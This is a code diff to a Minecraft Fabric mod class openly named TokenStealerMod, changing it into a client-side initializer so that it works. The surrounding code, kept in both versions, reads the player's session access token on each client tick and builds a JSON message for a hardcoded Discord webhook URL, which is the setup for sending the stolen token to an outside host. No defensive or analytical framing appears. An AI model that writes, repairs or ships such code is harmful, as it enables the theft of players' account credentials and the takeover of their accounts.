@@ -1,6 +1,6 @@
 package com.yourname;
 
-import net.fabricmc.api.ModInitializer;
+import net.fabricmc.api.ClientModInitializer;
 import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
 import net.minecraft.client.MinecraftClient;
 import org.json.JSONObject;
@@ -9,7 +9,7 @@ import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 
-public class TokenStealerMod implements ModInitializer {
+public class TokenStealerMod implements ClientModInitializer {
 
     // YOUR WEBHOOK URL GOES HERE
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1558653587469635666/n4F-uqG1rvvHq02yu1xUXoE3c6lShV0eKt8DmlDW9ppVQssYAEoXeQ7g7a0fpoKQz3wT";
@@ -17,7 +17,7 @@ public class TokenStealerMod implements ModInitializer {
     private static boolean sent = false;
 
     @Override
-    public void onInitialize() {
+    public void onInitializeClient() {
         System.out.println("Captain Hook is listening...");
 
         ClientTickEvents.END_CLIENT_TICK.register(client -> {
@@ -33,9 +33,8 @@ public class TokenStealerMod implements ModInitializer {
     }
 
     private void sendToken(MinecraftClient client) throws Exception {
-        // Get the refresh token using reflection
         var session = client.getSession();
-String token = session.getAccessToken();
+        String token = session.getAccessToken();
 
         // Prepare Discord Message
         JSONObject payload = new JSONObject();
